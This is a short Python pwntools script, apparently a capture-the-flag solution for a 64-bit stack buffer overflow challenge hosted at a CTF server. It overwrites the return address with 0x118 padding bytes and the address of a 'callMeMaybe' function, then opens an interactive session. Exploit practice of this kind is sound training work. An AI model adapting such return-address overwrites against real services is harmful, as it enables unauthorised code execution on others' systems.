from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3004)
#p = process('./64bof_basic')

callMeMaybe = 0x400606

payload = ''
payload += 'a'*0x118
payload += p64(callMeMaybe)

p.sendline(payload)


sleep(0.5)

p.interactive()





